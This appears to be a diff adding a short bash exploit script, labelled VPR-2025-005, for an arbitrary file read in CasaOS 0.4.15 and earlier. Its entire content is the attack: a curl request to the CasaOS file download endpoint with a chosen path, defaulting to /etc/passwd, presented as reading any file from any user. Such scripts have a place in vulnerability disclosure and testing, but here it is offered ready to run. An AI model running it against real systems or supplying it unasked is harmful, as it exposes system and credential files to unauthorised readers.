@@ -1,0 +1,17 @@
+#!/usr/bin/env bash
+
+# Exploit:          VPR-2025-005
+# Affects:          CasaOS <= 0.4.15
+# Purpose:          Arbitrary File Read
+# Description:      Read any file on disk from ANY user.
+
+# Created by:       VPR
+# Created:          June 15th, 2025
+
+# Updated by:       VPR
+# Updated:          June 15th, 2025
+
+DEFAULT_FILEPATH="/etc/passwd"
+FILEPATH="${1:-${DEFAULT_FILEPATH}}"
+
+curl "http://127.0.0.1/v1/file/download?path=${FILEPATH}"
